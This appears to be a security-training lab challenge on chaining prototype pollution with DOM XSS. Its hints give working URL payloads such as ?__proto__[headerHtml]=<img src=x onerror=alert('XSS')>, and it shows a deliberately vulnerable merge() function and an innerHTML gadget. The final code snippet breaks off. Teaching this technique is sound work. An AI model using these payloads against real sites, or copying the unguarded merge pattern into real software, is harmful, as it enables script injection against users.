Chain #5: Prototype Pollution + DOM XSS Expert

Objective

Execute alert('XSS') by chaining prototype pollution with a DOM XSS gadget. Pollute Object.prototype via URL parameters to override a config property that flows into an innerHTML sink through a rendering gadget.

Hints

The page uses a vulnerable merge() function that deep-merges URL params into a config object. It doesn't block __proto__ or constructor.prototype. Try: ?__proto__[headerHtml]=<img src=x onerror=alert('XSS')>
After merging config, the renderer checks config.headerHtml || defaults.headerHtml. If neither has it, it falls through to Object.prototype.headerHtml — your polluted value! This value is then rendered via innerHTML.
URL: ?__proto__[headerHtml]=<img/src/onerror=alert('XSS')>
The merge function sets Object.prototype.headerHtml. When the renderer reads widgetConfig.headerHtml from an empty object, it inherits the polluted value and renders it via innerHTML.

Attack Chain

// 1. Vulnerable merge (PP source)
function merge(target, src) {
  for (var key in src) {
    if (typeof src[key] === 'object')
      target[key] = merge(target[key]||{}, src[key]);
    else
      target[key] = src[key]; // __proto__!
  }
}

// 2. Gadget (PP → innerHTML)
var header = widgetConfig.headerHtml;
if (header) {
  el.innerHTML = header;
